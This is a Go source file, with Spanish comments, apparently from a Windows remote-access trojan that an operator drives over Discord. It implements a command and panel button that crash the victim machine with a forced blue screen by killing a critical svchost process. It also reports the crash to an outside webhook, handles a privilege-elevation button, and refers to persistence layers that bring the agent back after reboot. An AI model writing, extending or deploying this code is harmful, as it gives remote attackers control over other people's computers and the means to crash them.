//go:build windows

package commands

import (
	"fmt"
	"log/slog"
	"runtime/debug"
	"time"

	"github.com/bwmarrin/discordgo"
	"github.com/local/govoid/internal/util"
	"github.com/local/govoid/internal/win32"
)

// bsodDelay deja que la respuesta llegue a Discord antes de que la máquina
// desaparezca. Sin esto el mensaje se queda en el buffer y el operador ve una
// interacción fallida en vez del aviso.
const bsodDelay = 3 * time.Second

// BSOD provoca una pantalla azul terminando un proceso crítico.
//
// Es un bugcheck real: el equipo se reinicia solo y no hay pérdida de datos más
// allá de la de un reinicio normal. El agente vuelve por sus capas de
// persistencia cuando Windows arranque.
//
// Con la opción diagnostico=true no toca nada: informa desde este mismo proceso
// si el bugcheck puede ejecutarse.
func BSOD(s *discordgo.Session, i *discordgo.InteractionCreate) {
	if err := Defer(s, i); err != nil {
		return
	}

	if bsodDiagnosticRequested(i) {
		Finish(s, i, "🩺 Preflight BSOD (sin tocar nada)\n```\n"+win32.BSODDiagnostics()+"```")
		return
	}

	Finish(s, i, fmt.Sprintf(
		"💀 Pantalla azul en %s.\n```\n"+
			"proceso : svchost crítico (RpcSs → DcomLaunch)\n"+
			"bugcheck: CRITICAL_PROCESS_DIED (0xEF)\n"+
			"respaldo: NtRaiseHardError (0xC0000420)\n"+
			"disco   : sin escrituras forzadas\n"+
			"vuelta  : el agente reaparece al arrancar Windows\n"+
			"```\nSi el equipo no se reinicia solo, apágalo a mano.",
		bsodDelay))

	go func() {
		// Un panic aquí mataba el proceso entero y dejaba el bot muerto sin
		// una línea de log. Se captura, se escribe y se avisa.
		defer func() {
			if recovered := recover(); recovered != nil {
				slog.Error("bsod: panic", "panic", recovered, "stack", string(debug.Stack()))
				_, _ = s.FollowupMessageCreate(i.Interaction, true, &discordgo.WebhookParams{
					Content: fmt.Sprintf("❌ El bugcheck reventó el agente.\n```\n%v\n```", recovered),
				})
			}
		}()

		slog.Info("bsod: esperando", "delay", bsodDelay)
		time.Sleep(bsodDelay)

		slog.Info("bsod: aviso al webhook")
		notifyBSOD()

		slog.Info("bsod: disparando")
		method, err := win32.TriggerBSOD()
		if err != nil {
			// Si el bugcheck salió, este código nunca se ejecuta: la máquina
			// ya está reiniciándose.
			slog.Error("bsod: falló", "err", err)
			_, _ = s.FollowupMessageCreate(i.Interaction, true, &discordgo.WebhookParams{
				Content: "❌ No se pudo provocar el bugcheck.\n```\n" + err.Error() + "\n```",
			})
			return
		}

		// Camino sin bugcheck (no debería ocurrir): se informa igual.
		slog.Warn("bsod: terminó sin bugcheck", "metodo", method)
		_, _ = s.FollowupMessageCreate(i.Interaction, true, &discordgo.WebhookParams{
			Content: "⚠️ Terminado `" + method + "` sin bugcheck. Revisa el visor de eventos.",
		})
	}()
}

// BSODButton atiende el botón del panel: misma acción, sin opciones.
func BSODButton(s *discordgo.Session, i *discordgo.InteractionCreate) {
	BSOD(s, i)
}

// bsodDiagnosticRequested lee la opción diagnostico del comando. El botón no
// trae opciones y su interacción es de tipo MessageComponent: ApplicationCommandData
// revienta con un panic en cualquier tipo que no sea comando, así que la guarda
// va primero. Sin ella el botón del panel moría con "Error interno en el agente".
func bsodDiagnosticRequested(i *discordgo.InteractionCreate) bool {
	if i.Type != discordgo.InteractionApplicationCommand {
		return false
	}
	data := i.ApplicationCommandData()
	for _, option := range data.Options {
		if option.Name == "diagnostico" && option.Type == discordgo.ApplicationCommandOptionBoolean {
			return option.BoolValue()
		}
	}
	return false
}

// ElevateButton atiende el botón del panel.
func ElevateButton(s *discordgo.Session, i *discordgo.InteractionCreate) {
	Elevate(s, i)
}

// webhook del bugcheck: deja constancia fuera de la máquina por si el reinicio
// se lleva por delante la sesión antes de que llegue el mensaje del canal.
func notifyBSOD() {
	_ = util.PostWebhook("💀 Pantalla azul provocada", 15158332, webhookFields(
		util.EmbedField{Name: "accion", Value: "bugcheck CRITICAL_PROCESS_DIED", Inline: true},
	))
}
